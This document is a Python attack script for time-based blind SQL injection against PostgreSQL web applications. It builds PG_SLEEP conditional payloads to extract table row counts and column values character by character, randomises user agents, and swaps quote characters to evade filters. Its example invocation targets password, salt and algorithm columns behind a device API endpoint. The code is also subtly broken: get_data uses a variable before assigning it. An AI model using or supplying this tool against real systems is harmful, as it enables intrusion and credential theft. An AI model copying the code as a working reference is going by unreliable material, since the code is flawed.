#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
from urllib.parse import quote
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Specific settings for DBMS queries
and_or = " AND "
junk_str = "ABCD"
junk_int = "1234"
inj_prefix = and_or + junk_int
def_str = "1234"

# Decimal begin and end
dec_begin = 48
dec_end = 57

# ASCII char begin and end
ascii_begin = 32
ascii_end = 126

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
    # Optionally modify injection string via regex for character evasion
    #inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    #inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$
    # inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_str)              # Replace single quote for $$
    inj_params = dict()

    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = inj_regex_str

    inj_params_unencoded = "&".join("%s=%s" % (k,v) for k,v in inj_params.items())

    # Do GET or POST
    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)
    # Check response timing
    res = r.elapsed.total_seconds()
    if res >= sleep:
        return True
    elif res < sleep:
        return False
    else:
        print("[!] Something went wrong checking responses. Check responses manually. Exiting.")
        exit(-1)

# Extract rows
def get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep):
    rows = ""
    max_pos_rows = 10
    # Get number maximum positional characters of rows: e.g. 1096,2122,1234,etc.
    for pos in range(1,max_pos_rows+1):
        # Test if current pos does have any valid value. If not, break
        direction = quote(">",safe="")
        inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + "1) THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_str + " END) AND '" + junk_str + "'='" + junk_str + suffix
        if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
            break
        # Loop decimals
        direction = "="
        for num_rows in range(dec_begin,dec_end+1):
            row_char = chr(num_rows)
            inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + ")::text FROM " + str(pos) + " FOR 1))" + direction + str(num_rows) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
            if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                rows += row_char
                print(row_char,end='',flush=True)
                break
    if rows != "":
        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
        return int(rows)
    else:
        return 0

# Loop through positions and characters
def get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep):
    extracted = ""
    null = "NULL"
    max_pos_len = 50

    # Loop through length of string
    # Not very efficient, should use a guessing algorithm
    print("[*] Extracting strings from row " + str(row+1) + "...")
    for pos in range(0,max_pos_len):
        # Test if current pos does have any valid value. If not, break
        direction = quote(">",safe="")
        inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
        if not sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
            break
        # Loop through ASCII printable characters
        for guess in range(ascii_begin,ascii_end+1):
            extracted_char = chr(guess)
            direction = "="
            inj_str = prefix + inj_prefix + "=(CASE WHEN (ASCII(SUBSTRING((SELECT COALESCE(CAST(" + column + " AS VARCHAR(10000))::text,(CHR(" + str(ascii_begin) + "))) FROM " + table + " ORDER BY " + column + " OFFSET " + str(row) + " LIMIT 1)::text FROM " + str(pos) + " FOR 1))" + direction + str(guess) + ") THEN (SELECT " + junk_int + " FROM PG_SLEEP(" + str(sleep) + ")) ELSE " + junk_int + " END) AND '" + junk_str + "'='" + junk_str + suffix
            if sqli(url,headers,get_post,inj_param,params,inj_str,sleep):
                extracted += chr(guess)
                print(extracted_char,end='',flush=True)
                break
    return extracted

# Main
def main(argv):
    if len(sys.argv) == 9:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        prefix = sys.argv[3]
        suffix = sys.argv[4]
        columns = sys.argv[5].split(",")
        table = sys.argv[6]
        url = sys.argv[7]
        sleep = int(sys.argv[8])
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <column1,column2,..> <table> <url> <sleep_in_seconds>")
        print("[*] Example: " + sys.argv[0] + " apiKey,deviceName,longitude,latitude post \"1\" \";--+\" password_id,password,algorithm,salt aaapassword http://192.168.252.9/api/json/discovery/addDeviceToGMap 3\n")
        exit(0)

    # Random headers
    headers = http_headers()

    # Do stuff
    try:
        # Select parameter
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Getting rows
        print("[*] Printing number of rows in table...")
        rows = get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep)

        # Getting values for found rows in specified columns
        for column in columns:
            print("[*] Retrieving " + str(rows) + " rows of data using '" + column + "' as column and '" + table + "' as table...")
            for row in range(0,rows):
                retrieved = get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep)
                print("\n[*] Retrieved value '" + retrieved + "' for column '" + column + "' in row " + str(row+1))
    
        # Done
        print("\n[+] Done!\n")
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + str(e.code) + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()
        exit(-1)

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
